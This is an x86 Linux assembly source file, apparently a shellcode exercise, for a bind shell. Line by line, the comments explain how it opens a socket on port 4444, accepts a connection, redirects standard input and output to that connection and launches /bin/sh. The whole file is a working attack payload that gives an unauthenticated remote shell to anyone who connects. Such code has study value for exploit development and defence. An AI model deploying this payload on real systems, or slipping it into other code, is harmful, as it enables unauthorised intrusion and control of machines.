global _start

section .text
_start:

 xor ebx,ebx           ; clear ebx
 mul ebx               ; as well as eax and edx

 ; socket(AF_INET, SOCK_STREAM, 0)
 push eax              ; last arg first, push 0 onto the stack
 mov al,0x66           ; value for socketcall (102)
 mov bl,0x1            ; value for SYS_SOCKET syscall
 push ebx              ; second argument to call SOCK_STREAM
 push 0x2              ; third argument to call AF_INET
 mov ecx,esp           ; the stack pointer to the list
 int 0x80              ; punch it
 push edx              ; Setup for the next syscall,
 mov edx, eax          ; EDX is going to store our socket file descriptor

; populate the sockaddr_in structure with our settings
 inc bl                ; increment bl to 2 to use in our structure
 push word 0x5c11      ; sin_port, it has to be in big endian. port = 4444
 push word bx          ; sin_family, 0x2 is AF_INET
 mov esi,esp           ; save the location of sockaddr in esi for later

; bind(sockfd, (struct sockaddr *)&serverSA, sizeof(serverSA));
;setup the stack as our argument list to bind
 push 0x10             ; 1st argument: size of struct sockaddr (16)
 push esi              ; 2nd argument: address of our sockaddr_in structure
 push edx              ; 3rd argument: our socket descriptor
 mov ecx,esp           ; stack pointer pointing to our arg list
 mov al,0x66           ; socketcall number
 ; ebx is set to 0x2 from earlier which matches SYS_BIND
 int 0x80              ; make the call

; listen(sockfd, 2);
;setup the stack as our argument list to listen
 push 0x1              ; 1st argument: queue length
 push edx              ; 2nd argument: socket descriptor
 mov ecx,esp           ; stack pointer pointing to our arg list
 mov bl,0x4            ; SYS_LISTEN
 mov al,0x66           ; setup socketcall
 int 0x80              ; make the call

;newsockfd = accept(sockfd, (struct sockaddr *)&clientSA, &clientSaSize);
;setup the stack as our argument list to accept
 push 0x10                  ; size of sockaddr is 16 bytes
; accept requires a pointer (not the size itself) to an int containing
; the size of a struct sockaddr, currently ESP is pointing to this
 push esp 
; push our old sockaddr_in to be overwritten
 push esi 
 push edx                   ; our socket descriptor
 mov ecx,esp                ; our argument list
 mov al,0x66                ; setup socketcall
 mov bl,0x5                 ; 0x5 = accept
 int 0x80                   ; make the call
 mov ebx,eax                ; copy our new client socket to edx

; This section loops through dup2 for STDIN,STDOUT and STDERR 
; redirecting them to our client socket
 push 0x2                   ; setup the loop to start at 2
 pop ecx                    ; this needs to be stored in ecx
 ;dup2(newsockfd, 0);
dup_loop:
 mov al,0x3f                ; dup2 syscall = 63 
 ; ebx is set to our client socket descriptor
 int 0x80                   ; call it
 dec ecx                    ; decrement ecx
 jns dup_loop               ; keep going until ecx is -1 

;and finally make an execve call to fire off a new /bin/sh instance
;execve(arg_list[0], arg_list, NULL);
 xor edx,edx                ; clear edx
 push edx                   ; null terminate our string
 push 0x68732f2f            ; hs//
 push 0x6e69622f            ; nib/
 mov ebx, esp               ; save the address of our string (1st argument)
 push edx                   ; push a null onto the stack
 push ebx                   ; push the address of our string
; the stack now looks like [&string][null][string][null]
; the address of esp is the equivilent of a pointer to an null terminiated
; array of strings 
 lea ecx, [esp]             ; arg_list (2nd argument)
; edx is set to NULL (3rd argument)
 mov al,0xb                 ; 11 = execve
 int 0x80                   ; call it
